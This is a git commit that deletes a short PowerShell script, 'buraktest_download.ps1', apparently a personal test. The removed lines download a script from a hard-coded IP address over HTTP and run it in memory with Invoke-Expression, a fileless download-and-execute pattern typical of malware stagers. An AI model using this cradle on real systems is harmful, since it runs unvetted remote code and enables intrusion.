ea4ee610bcdef7908bdd60bcec3c9f24dcad2e06
Shootzz <cannburak9@gmail.com>
2024-05-28 15:30:28 +0300

    Delete buraktest_download.ps1

--- buraktest_download.ps1
+++
@@ -1,9 +0,0 @@
-# URL of the script to download
-$scriptUrl = "http://92.205.224.159/buraktest.ps1"
-
-# Download the script content
-$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
-$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
-
-# Execute the script in memory
-Invoke-Expression -Command $scriptContent
